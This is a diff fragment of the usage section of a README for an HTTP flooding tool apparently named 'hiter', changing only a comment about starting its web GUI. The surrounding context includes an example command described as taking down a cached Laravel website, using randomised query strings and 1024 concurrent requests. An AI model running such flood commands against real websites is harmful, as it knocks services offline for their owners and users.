@@ -31,7 +31,7 @@ Example:
 #take down a mem-cached laravel website  
 hiter -target https://wpdomain.com/search?q=* -concurrent 1024
 
-#start a webserver at 1337 port
+#start with web gui at port 1337
 hiter web -port 1337 -host 0.0.0.0 -password s3curePass
 ```
 note: you can use `*` in target url to replace it with a random string
